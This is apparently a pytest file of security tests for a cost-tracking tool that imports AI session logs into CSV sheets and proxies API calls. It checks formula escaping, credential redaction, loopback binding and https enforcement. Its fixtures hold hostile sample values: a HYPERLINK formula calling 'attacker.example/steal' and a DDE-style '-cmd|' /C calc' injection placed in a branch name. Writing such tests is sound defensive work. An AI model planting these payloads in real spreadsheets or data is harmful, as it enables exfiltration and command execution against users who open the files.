"""Security hardening: what the tool refuses, neutralises or warns about.
The privacy invariants of the log have their own tests in test_proxy.py
(test_no_secrets_or_content_in_log) and test_claude_sessions.py."""

from __future__ import annotations

import csv
import io
import json
import socket
import threading

import pytest

from cost_per_task import cli
from cost_per_task.importers.claude_sessions import discover_sessions, import_sheet, read_sheet, write_sheet
from cost_per_task.metrics import Attempt
from cost_per_task.prices_hub import fetch_hub
from cost_per_task.proxy import create_proxy
from cost_per_task.report import _attempt_table

FORMULA = '=HYPERLINK("http://attacker.example/steal","open me")'


def _transcript(sid: str, *, cwd: str, branch: str, title: str) -> str:
    lines = [
        {"type": "custom-title", "customTitle": title, "sessionId": sid},
        {"type": "assistant", "sessionId": sid, "timestamp": "2026-09-10T08:00:00Z", "requestId": "r1",
         "entrypoint": "cli", "cwd": cwd, "version": "2.1.257", "gitBranch": branch,
         "message": {"id": "m1", "model": "claude-fable-5", "role": "assistant", "content": [],
                     "usage": {"input_tokens": 1, "output_tokens": 1}}},
    ]
    return "\n".join(json.dumps(line) for line in lines) + "\n"


@pytest.fixture
def hostile_sessions(tmp_path):
    root = tmp_path / "claude" / "projects" / "p"
    root.mkdir(parents=True)
    (root / "H.jsonl").write_text(
        _transcript("H", cwd="C:\\work\\@evil", branch="-cmd|' /C calc'!A0", title=FORMULA), encoding="utf-8"
    )
    sessions, _ = discover_sessions([("code", tmp_path / "claude" / "projects")])
    return tmp_path, sessions


def test_sheet_cells_never_open_as_formulas(hostile_sessions):
    """A session title is written by a model from what it read; opened in
    Excel, a cell starting with = + - or @ would run as a formula."""
    tmp_path, sessions = hostile_sessions
    sheet = tmp_path / "sessions.csv"
    write_sheet(sheet, sessions)

    text = sheet.read_text(encoding="utf-8-sig").split("\n", 1)[1]  # past the sep= line
    cells = [cell for row in csv.reader(io.StringIO(text)) for cell in row]
    assert not [cell for cell in cells if cell[:1] in ("=", "+", "-", "@", "\t", "\r")]
    assert "'" + FORMULA in cells

    # Read back, the guard is gone: what the user sees in the tool is the real text.
    row = read_sheet(sheet)[0]
    assert row["title"] == FORMULA
    assert row["project"] == "@evil"
    assert row["task"].startswith("@evil/")

    # And the task survives the round trip into the log unchanged.
    row["outcome"] = "pass"
    result = import_sheet([row], sessions, {})
    assert result.records[0].task_id == row["task"]


def test_no_infer_leaves_the_branch_out_of_the_sheet(hostile_sessions):
    tmp_path, sessions = hostile_sessions
    write_sheet(tmp_path / "bare.csv", sessions, infer=False)
    row = read_sheet(tmp_path / "bare.csv")[0]
    assert (row["task"], row["branch"], row["task_source"]) == ("", "", "")


def test_upstream_url_with_credentials_is_refused_without_echoing_them(tmp_path, capsys):
    options = dict(log_path=tmp_path / "log.jsonl", task_id="T1", attempt_id="a1")
    with pytest.raises(ValueError) as caught:
        create_proxy(upstreams={"openai": "https://user:URL-PASSWORD@gateway.example/api"}, **options)
    assert "URL-PASSWORD" not in str(caught.value)

    assert cli._start_proxy(upstreams={"openai": "https://user:URL-PASSWORD@gateway.example"}, **options) is None
    captured = capsys.readouterr()
    assert "carries credentials" in captured.err
    assert "URL-PASSWORD" not in captured.err + captured.out


def test_plain_http_upstream_outside_the_machine_gets_a_warning(tmp_path, capsys):
    options = dict(log_path=tmp_path / "log.jsonl", task_id="T1", attempt_id="a1")
    server = cli._start_proxy(upstreams={"openai": "http://gateway.internal:8080"}, **options)
    server.server_close()
    assert "openai upstream (gateway.internal) is plain HTTP" in capsys.readouterr().err

    for quiet in ("http://127.0.0.1:9", "http://localhost:9", "https://gateway.internal"):
        server = cli._start_proxy(upstreams={"openai": quiet}, **options)
        server.server_close()
        assert capsys.readouterr().err == ""


def test_proxy_listens_on_loopback_only(tmp_path):
    server = create_proxy(log_path=tmp_path / "log.jsonl", task_id="T1", attempt_id="a1")
    try:
        assert server.server_address[0] == "127.0.0.1"
    finally:
        server.server_close()


def test_a_malformed_request_path_gets_a_502_and_no_traceback(fake_upstream, tmp_path, capsys):
    """http.client quotes the URL in its InvalidURL message; left uncaught, the
    server's traceback would print the query string, key included."""
    server = create_proxy(
        upstreams={"anthropic": fake_upstream}, log_path=tmp_path / "log.jsonl", task_id="T1", attempt_id="a1"
    )
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        with socket.create_connection(server.server_address, timeout=5) as client:
            client.sendall(
                b"POST /v1/messages\x7f?api_key=QUERY-STRING-SECRET HTTP/1.1\r\n"
                b"Host: x\r\nx-api-key: sk-test-DUMMY-KEY\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}"
            )
            reply = b""
            while chunk := client.recv(4096):
                reply += chunk
    finally:
        server.shutdown()
        server.server_close()
    assert reply.startswith(b"HTTP/1.1 502") or reply.startswith(b"HTTP/1.0 502")
    assert b"QUERY-STRING-SECRET" not in reply
    captured = capsys.readouterr()
    assert "QUERY-STRING-SECRET" not in captured.err + captured.out
    assert "Traceback" not in captured.err


def test_hub_url_must_be_a_web_address(tmp_path, capsys):
    secret = tmp_path / "secret.json"
    secret.write_text('{"models": []}', encoding="utf-8")
    with pytest.raises(ValueError, match="https://"):
        fetch_hub(secret.as_uri())
    assert cli.main(["prices", "refresh", "--provider", "anthropic", "--url", secret.as_uri()]) == 1
    assert "cannot load the hub catalogue" in capsys.readouterr().err


def test_long_task_ids_keep_their_telling_end_in_the_report():
    def attempt(task_id: str) -> Attempt:
        return Attempt(
            task_id=task_id, attempt_id="a1", model="m", task_type=None, cost=1.0, steps=1, input_tokens=0,
            cache_read_tokens=0, cache_write_tokens=0, output_tokens=0, reasoning_tokens=0, tool_calls=0,
            first_timestamp="", unpriced_steps=0,
        )

    short = _attempt_table([attempt("T1")], "USD")
    assert short[0].startswith("task         attempt")  # unchanged layout for short ids

    lines = _attempt_table([attempt("cost-per-task/issue-142"), attempt("x" * 60 + "/pr-14")], "USD")
    assert lines[2].startswith("cost-per-task/issue-142 ")
    assert "/pr-14 " in lines[3] and lines[3].startswith("...")
